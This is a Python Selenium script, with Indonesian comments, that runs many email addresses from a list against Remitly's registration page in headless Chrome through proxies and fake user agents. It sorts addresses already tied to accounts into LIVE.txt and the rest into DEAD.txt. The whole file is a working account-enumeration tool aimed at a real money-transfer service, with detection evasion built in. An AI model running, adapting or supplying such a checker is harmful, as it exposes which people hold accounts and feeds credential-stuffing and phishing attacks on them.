from selenium import webdriver
from lxml import html
import requests, re, sys, os, ctypes
from selenium.webdriver.support.select import Select
from time import sleep
from threading import Lock as LockPool
from multiprocessing.dummy import Pool as ThreadPool
from datetime import datetime, date
import time
from colorama import init, Fore
from selenium.webdriver.chrome.options import Options
import warnings
import json
from fake_useragent import UserAgent
my_fake_s = UserAgent()
ua = str(my_fake_s)
from selenium.webdriver.common.proxy import Proxy, ProxyType
valid = 0
invalid = 0
count = 0
myThreads = 20
myLock = LockPool()
myPool = ThreadPool(myThreads)

try:
    filelist = sys.argv[1]
    loglive = open('LIVE.txt', 'a')
    logdie = open('DEAD.txt', 'a')
except Exception as Err:
    try:
        print('Use '+sys.argv[0]+' list.txt')
        sys.exit()
    finally:
        Err = None
        del Err

list = (open(filelist, 'r', encoding='utf8')).readlines()

def file_size(file_path):
    """
    fungsi ini akan mengembalikan ukuran file
    """
    if os.path.isfile(file_path):
        file_info = os.stat(file_path)
        return convert_bytes(file_info.st_size)


file_path = filelist

def convert_bytes(num):
    """
    fungsi ini akan mengkonversi byte menjadi MB.... GB... etc
    """
    for x in ('Bytes', 'KB', 'MB', 'GB', 'TB'):
        if num < 1024.0:
            return '%3.1f %s' % (num, x)
        num /= 1024.0

warnings.filterwarnings("ignore", category=DeprecationWarning)

def login(email):
    global valid
    global invalid
    global count
    colors = {
    'merah': Fore.RED,
    'hijau': Fore.GREEN,
    'putih': Fore.WHITE,
    'kuning': Fore.YELLOW,
    'biru': Fore.CYAN,
    'black': Fore.BLACK
    }
    if os.system == "nt":
        path = "chromedriver.exe"
    else:
        path = "chromedriver"
    url = "https://www.remitly.com/us/en/users/register"
    f = open("proxies.txt", "r")
    proxies = f
    for proxi in proxies:
        myproxy = proxi
        
    prox = Proxy()
    prox.proxy_type = ProxyType.MANUAL
    prox.http_proxy = myproxy
    prox.socks5_proxy = myproxy
    prox.ssl_proxy = myproxy
    capabilities = webdriver.DesiredCapabilities.CHROME
    prox.add_to_capabilities(capabilities)
    options = Options()
    options.headless = True
    options.add_argument('log-level=3')
    options.accept_untrusted_certs = True
    options.assume_untrusted_cert_issuer = True
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-impl-side-painting")
    options.add_argument('--disable-gpu')
    options.add_argument("--disable-setuid-sandbox")
    options.add_argument("--disable-seccomp-filter-sandbox")
    options.add_argument("--disable-breakpad")
    options.add_argument("--disable-client-side-phishing-detection")
    options.add_argument("--disable-cast")
    options.add_argument("--disable-cast-streaming-hw-encoding")
    options.add_argument("--disable-cloud-import")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--disable-session-crashed-bubble")
    options.add_argument("--disable-ipv6")
    options.add_argument("--allow-http-screen-capture")
    options.add_argument("--start-maximized")
    driver = webdriver.Chrome(path, chrome_options=options, desired_capabilities=capabilities)
    driver.delete_all_cookies()
    driver.get(url)
    driver.find_element_by_name('email_address').send_keys(email)
    driver.find_element_by_name('password').send_keys('jakarta321')
    Select(driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/div/form/div[3]/div/select')).select_by_value('4')
    button = driver.find_element_by_xpath('/html/body/div[2]/div[2]/div/div/form/div[4]/button')
    button.click()
    # response = driver.find_elements_by_xpath("/html/body/div[2]/div[2]/div/div/script[1]")
    sleep(1)
    response = driver.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
    if 'This email address is associated with another account.' in (str(response)):
        with myLock:
            Pac = email
            loglive.write(Pac)
            count = count+1
            valid = valid+1
            print ("LIVE => " + email)
    else:
        with myLock:
            logdie.write(email)
            count = count+1
            invalid = invalid+1
            print ("DIE => " + email)

def finish():
    endTime = time.time()
    print('--------------------------------------------------------------------------------')
    print('Time Spent    :', round(endTime - startTime, 2), 'Seconds')
    print('[LIVE - ' + str(valid) + ' - DEAD - ' + str(invalid) + ']')
    
startTime = time.time()
if __name__ == '__main__':
    bersih = lambda : os.system('cls' if os.name == 'nt' else 'clear')
    myPool.map(login, list)
    myPool.close()
    myPool.join()
    finish()